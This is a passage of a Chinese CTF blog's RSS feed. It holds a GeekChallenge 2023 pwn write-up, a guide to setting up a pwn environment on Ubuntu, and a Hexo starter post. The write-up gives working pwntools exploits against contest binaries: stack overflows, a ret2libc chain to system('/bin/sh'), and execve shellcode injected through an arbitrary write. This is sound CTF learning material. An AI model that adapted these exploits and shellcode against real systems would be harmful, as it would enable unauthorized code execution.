class="string">b&#x27;\x12&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>http://example.com/2023/11/29/ISCTF-2023-wp-pwn-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>GeekChallenge 2023 wp pwn 部分题解</title>
      <link>http://example.com/2023/11/28/GeekChallenge-2023-wp-pwn-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</link>
      <guid>http://example.com/2023/11/28/GeekChallenge-2023-wp-pwn-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</guid>
      <pubDate>Tue, 28 Nov 2023 14:59:51 GMT</pubDate>
      
      <description>&lt;h3 id=&quot;nc-pwntools&quot;&gt;&lt;a href=&quot;#nc-pwntools&quot; class=&quot;headerlink&quot; title=&quot;nc pwntools&quot;&gt;&lt;/a&gt;nc pwntools&lt;/h3&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; pwn &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p=remote(&lt;span class=&quot;string&quot;&gt;&amp;quot;pwn.node.game.sycsec.com&amp;quot;&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;31441&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;context(arch=&lt;span class=&quot;string&quot;&gt;&amp;quot;amd64&amp;quot;&lt;/span&gt;,os=&lt;span class=&quot;string&quot;&gt;&amp;quot;linux&amp;quot;&lt;/span&gt;,log_level=&lt;span class=&quot;string&quot;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pd1 = &lt;span class=&quot;string&quot;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&quot;number&quot;&gt;92&lt;/span&gt; + &lt;span class=&quot;string&quot;&gt;b&amp;#x27;&#92;x53&#92;x79&#92;x63&#92;x6c&#92;x6F&#92;x76&#92;x65&#92;x72&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.recvuntil(&lt;span class=&quot;string&quot;&gt;b&amp;#x27;This string need to be 100 characters long&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.send(pd1)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.recvuntil(&lt;span class=&quot;string&quot;&gt;b&amp;#x27;2.This challenge is harder than first one&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;calc = p.recvuntil(&lt;span class=&quot;string&quot;&gt;&amp;#x27;=&amp;#x27;&lt;/span&gt;,drop=&lt;span class=&quot;literal&quot;&gt;True&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.sendline(&lt;span class=&quot;built_in&quot;&gt;str&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;eval&lt;/span&gt;(calc)))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h3 id="nc-pwntools"><a href="#nc-pwntools" class="headerlink" title="nc pwntools"></a>nc pwntools</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;pwn.node.game.sycsec.com&quot;</span>,<span class="number">31441</span>)</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pd1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">92</span> + <span class="string">b&#x27;\x53\x79\x63\x6c\x6F\x76\x65\x72&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;This string need to be 100 characters long&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(pd1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;2.This challenge is harder than first one&#x27;</span>)</span><br><span class="line">calc = p.recvuntil(<span class="string">&#x27;=&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">eval</span>(calc)))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>开了pie，最后三位不变，直接改最后一位字节就可以跳转到backdoor</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;pwn.node.game.sycsec.com&quot;</span>,<span class="number">31396</span>)</span><br><span class="line"></span><br><span class="line">pd = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x50</span> + <span class="number">8</span>) + <span class="string">b&#x27;\x27&#x27;</span></span><br><span class="line">p.send(pd)</span><br><span class="line"></span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>泄露gets的地址，要在附件中找到这个片段mov_edx_edi_eax，其他的都很常规</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;pwn.node.game.sycsec.com&quot;</span>,<span class="number">30616</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/chal&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/feichai/ctf_file/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt.write</span><br><span class="line">gets_got = elf.got.gets</span><br><span class="line">vuln = elf.sym.vuln</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401333</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000401331</span></span><br><span class="line">mov_edx_edi_eax = <span class="number">0x0000000000401288</span></span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&#x27;a\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span> + <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">pd = offset</span><br><span class="line">pd += p64(pop_rsi_r15) + p64(gets_got) + p64(<span class="number">1</span>)</span><br><span class="line">pd += p64(mov_edx_edi_eax)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;This challenge no backdoor!&quot;</span>,pd)</span><br><span class="line"></span><br><span class="line">gets_addr = u64(p.recv()[:<span class="number">8</span>])</span><br><span class="line">info(<span class="string">&quot;gets_addr:%#x&quot;</span>,gets_addr)</span><br><span class="line"></span><br><span class="line">libc_base = gets_addr - libc.symbols[<span class="string">b&#x27;gets&#x27;</span>]</span><br><span class="line">libc_system = libc_base + libc.symbols[<span class="string">b&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">pd2 = offset + p64(pop_rdi) + p64(bin_sh_addr) + p64(libc_system)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;This challenge no backdoor!&quot;</span>,pd2)</span><br><span class="line"></span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure><h3 id="password"><a href="#password" class="headerlink" title="password"></a>password</h3><p>直接爆破，密码是随机数，第一个字节有256种情况，爆破到第一个字节为\x00的时候就通了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x4012F3</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">b&#x27;Wrong&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="string">b&#x27;Wrong&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line"></span><br><span class="line">    p=remote(<span class="string">&quot;pwn.node.game.sycsec.com&quot;</span>,<span class="number">30542</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;please enter user name:&quot;</span>)</span><br><span class="line">    pd = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(backdoor)</span><br><span class="line">    p.sendline(pd)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&quot;please enter password:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">    res = p.recv(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive() </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="write1"><a href="#write1" class="headerlink" title="write1"></a>write1</h3><p>第一个scanf传什么没什么关系，随便传，利用for循环内指针改返回地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;pwn.node.game.sycsec.com&quot;</span>,<span class="number">31848</span>)</span><br><span class="line"></span><br><span class="line">return_addr = <span class="number">0x40134D</span></span><br><span class="line">backdoor = <span class="number">0x401225</span></span><br><span class="line"></span><br><span class="line">pd = <span class="string">b&#x27;\x11\x22\x33\x44\x55\x66\x77\x88&#x27;</span></span><br><span class="line">p.sendline(pd)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;index:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;40&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;value:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-28&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;index:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;41&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;value:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;index:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive() </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="write2"><a href="#write2" class="headerlink" title="write2"></a>write2</h3><p>第一个scanf传入shellcode，再修改返回地址回到shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;pwn.node.game.sycsec.com&quot;</span>,<span class="number">31409</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;index_addr:0x&quot;</span>)</span><br><span class="line">v1_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)+<span class="number">4</span></span><br><span class="line">hax_v1_addr = <span class="built_in">hex</span>(v1_addr)</span><br><span class="line">v2_addr= hax_v1_addr[<span class="number">2</span>:]</span><br><span class="line">info(<span class="string">&quot;v2_addr:%s&quot;</span>,v2_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">11</span>,<span class="number">2</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(<span class="number">40</span>+i/<span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&quot;value:&quot;</span>)</span><br><span class="line">    p.sendline(v2_addr[<span class="number">11</span>-i-<span class="number">1</span>:<span class="number">11</span>-i+<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;index:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive() </span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>http://example.com/2023/11/28/GeekChallenge-2023-wp-pwn-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Pwn虚拟机环境配置超详细版</title>
      <link>http://example.com/2023/10/18/Pwn%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B6%85%E8%AF%A6%E7%BB%86%E7%89%88/</link>
      <guid>http://example.com/2023/10/18/Pwn%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B6%85%E8%AF%A6%E7%BB%86%E7%89%88/</guid>
      <pubDate>Wed, 18 Oct 2023 05:15:10 GMT</pubDate>
      
      <description>&lt;p&gt;​		原来的虚拟机被我搞崩了，只能重装了(脚本全无了呜呜呜)，看到网上的安装教程都比较零碎，多多少少也有点小瑕疵，因此，我决定水一篇博客(bushi)，写一下我的pwn虚拟机环境全套安装路程。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p>​原来的虚拟机被我搞崩了，只能重装了(脚本全无了呜呜呜)，看到网上的安装教程都比较零碎，多多少少也有点小瑕疵，因此，我决定水一篇博客(bushi)，写一下我的pwn虚拟机环境全套安装路程。</p><span id="more"></span><h2 id="版本说明"><a href="#版本说明" class="headerlink" title="版本说明"></a>版本说明</h2><p>Linux版本：Ubuntu20.04</p><p>Python版本：Python3.8.10</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h3><p>这个没什么大问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install vim</span><br></pre></td></tr></table></figure><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><p>先按个pip，再按pwntools</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python3-pip</span><br><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure><h3 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h3><p>先按个git，再安装pwndbg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git</span><br><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">sudo ./setup.sh</span><br></pre></td></tr></table></figure><p>然后测试一下是否成功</p><p><img src="/imgs/Pwn%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B6%85%E8%AF%A6%E7%BB%86%E7%89%88/3cdadb568be0e7fd2c61ba98cc52b4e.png"></p><p>出现上面的红色的pwndbg&gt;即为成功，若不是，而是出现原始版的 (gdb) ,则需要配置一下默认的调试器</p><p>命令行输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.gdbinit</span><br></pre></td></tr></table></figure><p>按 i 键可进行编辑，然后添加下面代码，然后再按 Esc 键可以退出编辑模式，输入 :wq 然后回车即可保存退出即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/pwndbg/gdbinit.py</span><br></pre></td></tr></table></figure><p>如下</p><p><img src="/imgs/Pwn%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B6%85%E8%AF%A6%E7%BB%86%E7%89%88/07cbfa76506005efce49fd5569dd577.png"></p><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install checksec</span><br></pre></td></tr></table></figure><p>之前用的checksec是下面的格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec filename</span><br></pre></td></tr></table></figure><p>但是今天重新安装的这个改了，需要用到下面的格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec --file=filename</span><br></pre></td></tr></table></figure><p><img src="/../imgs/Pwn%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B6%85%E8%AF%A6%E7%BB%86%E7%89%88/b4fe46c11a942b09df37ba6307ca76a.png"></p><h3 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h3><p>网上的方法大部分都是Python2的方法，对于Python3基本不管用，建议Python3的用这个安装，就是有个缺点，没网的时候不能用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install LibcSearcher</span><br></pre></td></tr></table></figure><h3 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-capstone</span><br><span class="line">git clone https://github.com/JonathanSalwan/ROPgadget.git</span><br></pre></td></tr></table></figure><p>这里第二句如果报错说无法连接gitHub的话，我的做法是换镜像源，没报错就跳过下面这段代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global url.&quot;https://ghproxy.com/https://github.com&quot;.insteadOf &quot;https://github.com&quot;</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ROPgadget</span><br><span class="line">sudo python3 setup.py install</span><br></pre></td></tr></table></figure><p>然后在命令行输入ROPgadget测试一下</p><p>如果报错，如下</p><p><img src="/imgs/Pwn%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B6%85%E8%AF%A6%E7%BB%86%E7%89%88/f97382479d97ce7d0d812ada2fe34ff.png"></p><p>意思是缺少上面红色框框内的文件</p><p>很简单就可以解决，注意下面代码的路径是你自己电脑上的报错路径，其他的不用改，如我报错路径是上面红色框框内的内容，我就需要输入以下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp -r scripts /home/feichai/.local/lib/python3.8/site-packages/ROPGadget-7.4.dist-info</span><br></pre></td></tr></table></figure><p>注意这行代码需要在ROPgadget文件夹里面运行，因为代码中的scripts文件夹在ROPgadget文件夹里面，如果不在ROPgadget文件夹里面运行则需要自己把路径弄好</p><h3 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h3><p>这个安装比较简单，运行下面代码即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ruby -y</span><br><span class="line">sudo apt-get install gem -y</span><br><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure><p>本文持续更新中，一些没提及的插件会在之后附上教程……</p>]]></content:encoded>
      
      
      
      
      <comments>http://example.com/2023/10/18/Pwn%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B6%85%E8%AF%A6%E7%BB%86%E7%89%88/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Hello World</title>
      <link>http://example.com/2023/10/07/hello-world/</link>
      <guid>http://example.com/2023/10/07/hello-world/</guid>
      <pubDate>Sat, 07 Oct 2023 15:25:58 GMT</pubDate>
      
      <description>&lt;p&gt;​    哈喽大家好，这是我的第一篇博客，在这里，我将记录一名ctfer小菜鸡的成长笔记，希望大家喜欢！&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p>​    哈喽大家好，这是我的第一篇博客，在这里，我将记录一名ctfer小菜鸡的成长笔记，希望大家喜欢！</p><span id="more"></span><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content:encoded>
      
      
      
      
      <comments>http://example.com/2023/10/07/hello-world/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
